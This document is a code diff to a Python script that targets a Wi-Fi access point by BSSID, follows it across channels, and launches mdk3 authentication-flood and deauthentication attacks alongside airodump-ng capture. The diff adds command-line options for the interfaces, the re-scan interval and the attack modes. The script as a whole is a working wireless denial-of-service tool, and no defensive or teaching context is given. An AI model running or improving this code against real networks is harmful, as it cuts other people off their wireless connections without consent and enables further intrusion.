@@ -16,9 +16,6 @@ console: Console = Console()
 
 install()
 
-INTERFACE_1 = "wlan0"
-INTERFACE_2 = "wlan0mon"
-
 
 class Target:
     obj = None
@@ -36,10 +33,12 @@ class Target:
     def __setattr__(self, name: str, value: Any, /) -> None:
         if hasattr(self, name):
             super().__setattr__(name, value)
-            print(self)
+            logger.success(
+                rf"The target was found <b>{self.bssid!r}</b> on <b>{self.channel!r}</b> channel!"
+            )
 
-            logger.info(f"Set up the {INTERFACE_2} link.")
-            subprocess.run(["sudo", "ip", "link", "set", INTERFACE_2, "up"])
+            logger.info(f"Set up the {_interface_monitored} link.")
+            subprocess.run(["sudo", "ip", "link", "set", _interface_monitored, "up"])
 
             logger.info(f"Starting the <b>airodump-ng</b> sub process...")
             threading.Thread(
@@ -57,26 +56,39 @@ class Target:
                         f"{self.bssid}",
                         "--channel",
                         f"{self.channel}",
-                        INTERFACE_2,
+                        _interface_monitored,
                     ],
                 ),
                 kwargs={"stdout": open(os.devnull, "wt")},
             ).start()
 
-            logger.info("Starting the <b>mdk3</b> sub processes...")
-            threading.Thread(
-                target=subprocess.run,
-                args=(
-                    ["sudo", "mdk3", INTERFACE_2, "a", "-a", self.bssid, "-c", "-m"],
-                ),
-                kwargs={"stdout": open(os.devnull, "wt")},
-            ).start()
+            if _mdk3_a_mode or _mdk3_d_mode:
+                logger.info("Starting the <b>mdk3</b> sub processe(s)...")
 
-            threading.Thread(
-                target=subprocess.run,
-                args=(["sudo", "mdk3", INTERFACE_2, "d"],),
-                kwargs={"stdout": open(os.devnull, "wt")},
-            ).start()
+            if _mdk3_a_mode:
+                threading.Thread(
+                    target=subprocess.run,
+                    args=(
+                        [
+                            "sudo",
+                            "mdk3",
+                            _interface_monitored,
+                            "a",
+                            "-a",
+                            self.bssid,
+                            "-c",
+                            "-m",
+                        ],
+                    ),
+                    kwargs={"stdout": open(os.devnull, "wt")},
+                ).start()
+
+            if _mdk3_d_mode:
+                threading.Thread(
+                    target=subprocess.run,
+                    args=(["sudo", "mdk3", _interface_monitored, "d"],),
+                    kwargs={"stdout": open(os.devnull, "wt")},
+                ).start()
 
         return super().__setattr__(name, value)
 
@@ -84,28 +96,28 @@ class Target:
         return f"<Target bssid={self.bssid!r} channel={self.channel!r}>"
 
 
-def refresh(interface: str):
+def refresh():
     while True:
         logger.info("Killing previous processes...")
         os.system("sudo pkill -9 mdk3")
         os.system("sudo pkill -9 airodump-ng")
 
-        logger.info(f"Set down the {INTERFACE_2} link.")
-        subprocess.run(["sudo", "ip", "link", "set", INTERFACE_2, "down"])
+        logger.info(f"Set down the {_interface_monitored} link.")
+        subprocess.run(["sudo", "ip", "link", "set", _interface_monitored, "down"])
 
-        logger.info(f"Set up the {interface} link.")
-        subprocess.run(["sudo", "ip", "link", "set", interface, "up"])
+        logger.info(f"Set up the {_interface_managed} link.")
+        subprocess.run(["sudo", "ip", "link", "set", _interface_managed, "up"])
 
         logger.info(f"Scanning...")
         process = subprocess.run(
-            ["sudo", "iw", "dev", interface, "scan"],
+            ["sudo", "iw", "dev", _interface_managed, "scan"],
             capture_output=True,
             text=True,
             check=False,
         )
 
-        logger.info(f"Set down the {interface} link.")
-        subprocess.run(["sudo", "ip", "link", "set", interface, "down"])
+        logger.info(f"Set down the {_interface_managed} link.")
+        subprocess.run(["sudo", "ip", "link", "set", _interface_managed, "down"])
 
         logger.info(f"Extracting the BSSID and Channel...")
         process = subprocess.run(
@@ -142,16 +154,45 @@ def refresh(interface: str):
             logger.info(f"Update channel to {channel!r}.")
             Target.obj.channel = channel
 
-            logger.info("Sleep 15 for seconds.")
-            sleep(15)
+            logger.info(f"Sleep {_interval} for seconds.")
+            sleep(_interval)
 
         sleep(2.5)
 
 
 @click.command()
 @click.option("--bssid", type=str, required=True, help="Specify the target BSSID.")
-def main(bssid: str) -> None:
-    threading.Thread(target=refresh, args=(INTERFACE_1,)).start()
+@click.option("--interval", type=int, default=30)
+@click.option("--mdk3-a-mode", default=False)
+@click.option("--mdk3-d-mode", default=True)
+@click.argument("interface_managed")
+@click.argument("interface_monitored")
+def main(
+    bssid: str,
+    interval,
+    mdk3_a_mode,
+    mdk3_d_mode,
+    interface_managed,
+    interface_monitored,
+) -> None:
+    logger.debug(rf"BSSID: <b>{bssid!r}</b>")
+    logger.debug(rf"Interval: <b>{interval!r}</b>")
+    logger.debug(rf"Managed Interface: <b>{interface_managed!r}</b>")
+    logger.debug(rf"Monitored Interface: <b>{interface_monitored!r}</b>")
+
+    global _interface_managed
+    global _interface_monitored
+    global _mdk3_a_mode
+    global _mdk3_d_mode
+    global _interval
+
+    _interface_managed = interface_managed
+    _interface_monitored = interface_monitored
+    _mdk3_a_mode = mdk3_a_mode
+    _mdk3_d_mode = mdk3_d_mode
+    _interval = interval
+
+    threading.Thread(target=refresh).start()
 
     Target(bssid)
 
